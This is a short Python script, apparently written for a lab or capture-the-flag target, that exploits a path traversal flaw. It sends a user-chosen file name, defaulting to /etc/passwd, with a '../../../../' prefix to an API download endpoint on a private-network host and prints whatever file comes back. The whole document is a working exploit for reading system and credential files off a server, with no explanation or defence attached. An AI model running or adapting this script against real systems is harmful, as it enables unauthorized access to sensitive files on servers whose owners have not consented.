import requests

filename = input("Enter file name u wanna read(Default /etc/passwd): ").strip() or "/etc/passwd"

url = f"http://172.16.8.240/api/download?file=../../../../{filename}"

response = requests.get(url)

#if response.status_code == 404:
    #print("File not found status code is 404")
#else:
print(response.text)
